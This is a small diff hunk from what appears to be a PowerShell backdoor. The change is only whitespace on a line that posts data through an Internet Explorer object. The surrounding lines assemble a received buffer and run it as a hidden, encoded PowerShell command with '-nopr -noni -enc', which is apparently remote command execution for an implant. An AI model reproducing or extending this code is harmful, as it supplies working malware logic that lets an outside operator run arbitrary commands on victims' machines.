@@ -32,7 +32,7 @@ function run {
       $buf.add($d) | out-null;
       $col++;
     }
-    post $ie  'Tx'  ($s + '|2') '0';
+    post $ie 'Tx' ($s + '|2') '0';
     if ($type -eq '@') {
       $xc = $buf -join '';
       $r = powershell.exe -nopr -noni -enc $xc;
